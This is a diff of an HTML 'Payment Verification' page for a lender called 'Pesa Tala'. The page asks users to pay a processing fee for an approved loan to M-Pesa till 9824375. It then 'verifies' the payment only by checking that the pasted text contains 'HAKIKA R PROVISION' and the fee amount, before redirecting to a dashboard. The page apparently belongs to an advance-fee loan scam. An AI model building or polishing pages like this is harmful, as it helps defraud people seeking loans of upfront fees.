@@ -2,83 +2,82 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Pesa Tala - Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification - PESA TALA</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gradient-to-br from-purple-900 via-purple-800 to-gray-100 min-h-screen flex items-center justify-center px-4 text-white">
+<body class="bg-gradient-to-tr from-purple-900 via-purple-700 to-gray-200 min-h-screen p-4 flex items-center justify-center text-purple-900">
 
-  <div class="bg-white/10 backdrop-blur-md rounded-2xl shadow-2xl max-w-md w-full p-6 border border-purple-400">
-    <h2 class="text-2xl font-bold text-yellow-400 text-center mb-4">🔐 Payment Verification</h2>
+  <div class="bg-white/90 backdrop-blur-md max-w-sm w-full rounded-2xl shadow-2xl p-6">
 
-    <p id="introMessage" class="text-sm text-gray-200 mb-4"></p>
+    <div class="text-center mb-4">
+      <h2 class="text-2xl font-bold text-purple-800">Payment Verification</h2>
+      <p class="text-sm text-gray-600">Please complete your processing fee payment to continue.</p>
+    </div>
 
-    <!-- Change Plan Button -->
-    <button onclick="window.location.href='checklimit.html'" class="mb-4 w-full bg-yellow-400 hover:bg-yellow-300 text-purple-900 font-bold py-2 rounded-xl shadow transition">
-      Change Loan Limit
-    </button>
+    <div class="bg-purple-50 border border-purple-200 rounded-xl p-4 text-sm mb-4">
+      <p><strong>Loan Amount:</strong> Ksh <span id="loanAmount">...</span></p>
+      <p><strong>Processing Fee:</strong> Ksh <span id="processingFee">...</span></p>
+    </div>
 
-    <!-- Payment Instructions -->
-    <div class="bg-white text-purple-900 rounded-xl p-4 shadow mb-6 text-sm">
-      <p><strong>How to Pay via M-Pesa:</strong></p>
-      <ul class="list-disc list-inside mt-2 space-y-1">
-        <li>Go to M-Pesa: <strong>M-PESA</strong></li>
-        <li>Lipa na M-Pesa: <strong>LIPA NA MPESA</strong></li>
-        <li>Enter Till Number: <strong id="tillNumber">9824375</strong></li>
-        <li>
-          <button onclick="copyTill()" class="mt-2 bg-purple-700 hover:bg-purple-800 text-white px-3 py-1 rounded shadow text-sm">📋 Click to Copy Till</button>
+    <div class="bg-purple-100 p-4 rounded-xl mb-4 text-sm text-gray-800">
+      <p class="font-semibold mb-2">How to pay via M-Pesa:</p>
+      <ul class="space-y-1">
+        <li>Go to M-PESA: <strong>M-PESA</strong></li>
+        <li>Lipa na M-PESA: <strong>LIPA NA MPESA</strong></li>
+        <li>Enter Till Number: <strong id="tillNumber">9824375</strong>
+          <button onclick="copyTill()" class="ml-2 text-xs text-purple-600 underline">Copy</button>
         </li>
-        <li>Enter Amount: <strong id="amountDisplay">Ksh ...</strong></li>
-        <li>Complete Payment: <strong>Enter M-Pesa PIN</strong></li>
+        <li>Enter Amount: <strong id="amountToPay">Ksh ...</strong></li>
+        <li>Enter your M-PESA PIN</li>
       </ul>
     </div>
 
-    <!-- M-Pesa Message -->
-    <label for="mpesaMessage" class="text-sm text-gray-200 font-semibold">Paste M-Pesa Payment Message:</label>
-    <textarea id="mpesaMessage" placeholder="Paste message here..." class="w-full p-3 rounded-lg border mt-2 mb-4 text-black" rows="4"></textarea>
-
-    <button onclick="verifyPayment()" class="w-full bg-yellow-400 hover:bg-yellow-300 text-purple-900 font-bold py-2 rounded-xl shadow">
-      ✅ Verify Payment
+    <button onclick="window.location.href='checklimit.html'"
+            class="w-full mb-4 bg-gray-200 hover:bg-gray-300 text-purple-700 font-medium py-2 rounded-xl">
+      Change Savings Plan
     </button>
 
-    <!-- Result Display -->
-    <div id="result" class="mt-4 text-center font-semibold text-lg hidden"></div>
+    <label for="mpesaMessage" class="block mb-1 text-sm font-medium text-gray-700">Paste M-PESA Confirmation Message:</label>
+    <textarea id="mpesaMessage" rows="3" placeholder="Paste message here..." class="w-full p-3 border border-purple-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 text-sm mb-4"></textarea>
+
+    <button onclick="verifyPayment()" class="w-full bg-purple-700 hover:bg-purple-800 text-white font-semibold py-3 rounded-xl transition">
+      Verify Payment
+    </button>
+
+    <p id="status" class="text-center mt-4 text-sm text-red-500 hidden">❌ Verification failed. Check message content.</p>
+    <p id="success" class="text-center mt-4 text-green-600 text-sm font-semibold hidden">✅ Payment Verified! Proceeding...</p>
   </div>
 
   <script>
-    const name = localStorage.getItem("userName") || "User";
-    const loan = parseInt(localStorage.getItem("pickedLoanAmount")) || 4000;
-    const fee = parseInt(localStorage.getItem("processingFee")) || 220;
+    const loanAmount = localStorage.getItem("loanAmount") || "3000";
+    const processingFee = localStorage.getItem("processingFee") || "150";
 
-    document.getElementById("amountDisplay").textContent = "Ksh " + fee;
-    document.getElementById("introMessage").textContent = `Hi, ${name}. To proceed, HAKIKA R PROVISION requires you to make a one-time processing fee payment of Ksh ${fee} for your approved loan of Ksh ${loan.toLocaleString()} using the instructions below.`;
+    document.getElementById("loanAmount").textContent = parseInt(loanAmount).toLocaleString();
+    document.getElementById("processingFee").textContent = parseInt(processingFee).toLocaleString();
+    document.getElementById("amountToPay").textContent = "Ksh " + parseInt(processingFee).toLocaleString();
 
     function copyTill() {
-      const till = document.getElementById("tillNumber").innerText;
-      navigator.clipboard.writeText(till).then(() => {
-        alert("✅ Till number copied: " + till);
+      navigator.clipboard.writeText("9824375").then(() => {
+        alert("Till number copied to clipboard!");
       });
     }
 
     function verifyPayment() {
       const message = document.getElementById("mpesaMessage").value.toUpperCase();
-      const result = document.getElementById("result");
+      const expected = "HAKIKA R PROVISION";
+      const amountMatch = processingFee;
 
-      if (message.includes("HAKIKA R PROVISION") && message.includes(fee.toString())) {
-        result.textContent = "🎉 Payment Verified! Redirecting...";
-        result.classList.remove("text-red-500");
-        result.classList.add("text-green-400");
-        result.classList.remove("hidden");
+      if (message.includes(expected) && message.includes(amountMatch)) {
+        document.getElementById("status").classList.add("hidden");
+        document.getElementById("success").classList.remove("hidden");
 
-        // Redirect after 3s
         setTimeout(() => {
-          window.location.href = "password.html";
-        }, 3000);
+          window.location.href = "dashboard.html";
+        }, 2500);
       } else {
-        result.textContent = `❌ Verification Failed. Ensure message includes "HAKIKA R PROVISION" and the exact amount Ksh ${fee}`;
-        result.classList.remove("text-green-400");
-        result.classList.add("text-red-500");
-        result.classList.remove("hidden");
+        document.getElementById("success").classList.add("hidden");
+        document.getElementById("status").classList.remove("hidden");
       }
     }
   </script>
